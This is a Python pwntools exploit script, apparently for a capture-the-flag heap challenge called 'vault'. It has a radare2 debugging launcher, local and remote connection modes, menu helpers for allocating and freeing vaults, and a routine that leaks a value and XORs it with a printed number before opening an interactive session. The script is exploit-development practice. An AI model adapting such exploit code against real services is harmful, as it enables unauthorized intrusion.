#!/usr/bin/env python3
import os
import sys
import subprocess
from pwn import *

exe = ELF("./vault_patched")
libc = ELF("./libc.so.6")
ld = ELF("./ld-linux-x86-64.so.2")
context.binary = exe

URL = ''
PORT = 0

def start(argv=[], *a, **kw):
    if args.R2:
        io = process([exe.path] + argv, *a, **kw)
        # changeme sys.main
        # parametri di r2 personalizzabili
        # es:
        # r2_cmd = "r2 -c 'db sym.foo+122; dc; Vpp; px @ section..got' -d " + str(io.pid)
        r2_cmd = "r2 -c 'aa; db sym.main+518; dc; Vpp' -d " + str(io.pid)
        
        subprocess.Popen(
            [
            "x-terminal-emulator",                  # open systen default terminal emulator
             "-e", 
             os.environ.get("SHELL", "/bin/sh"),    # execute default shell
             "-c", 
             r2_cmd],                               # with radare2 command
            stdout=subprocess.DEVNULL,
            stderr=subprocess.STDOUT
        )
        # pause the current python script until key pressed
        # manually added to avoid race condition waiting for r2 to start     
        ui.pause()
        return io

    if args.REMOTE:
        try:
            host = sys.argv[1]
            port_val = int(sys.argv[2])
        except (IndexError, ValueError):
            host = URL
            port_val = PORT

        if not host or not port_val:
            log.error(
                "REMOTE mode selected but HOST or PORT is missing or invalid.\n"
                "Usage example:\n"
                "  ./exploit.py REMOTE 8.8.8.8 9999\n"
                "Or set URL and PORT variables in the script."
            )
            exit(1)

        log.info("Connecting to remote"+ str(host) + str(port_val))
        return remote(host, port_val)

    else:
        log.info("Launching local process")
        return process([exe.path] + argv, *a, **kw)


io = start()

def create_vault(index):
    io.sendlineafter(b'> ', b'1')
    io.sendlineafter(b'index: ', str(index).encode())

def change_items(index, what):
    io.sendlineafter(b'> ', b'2')
    io.sendlineafter(b'index: ', str(index).encode())
    io.sendlineafter(b'vault? ', what)

def access_vault(index):
    io.sendlineafter(b'> ', b'3')
    io.sendlineafter(b'index: ', str(index).encode())
    io.recvuntil(b'ur stuff: ')
    data = io.recvline().strip()
    return u64(data.ljust(8, b'\x00'))

def free_vault(index):
    io.sendlineafter(b'> ', b'4')
    io.sendlineafter(b'index: ', str(index).encode())

def change_username(what):
    io.sendlineafter(b'> ', b'5')
    io.sendlineafter(b'new id: : ', what)

io.recvuntil(b'number: ')
luck = io.recvline().strip().decode()
luck = int(luck, 16)
create_vault(0)
create_vault(1)
data = access_vault(1)

success(hex(data^luck))

io.interactive()
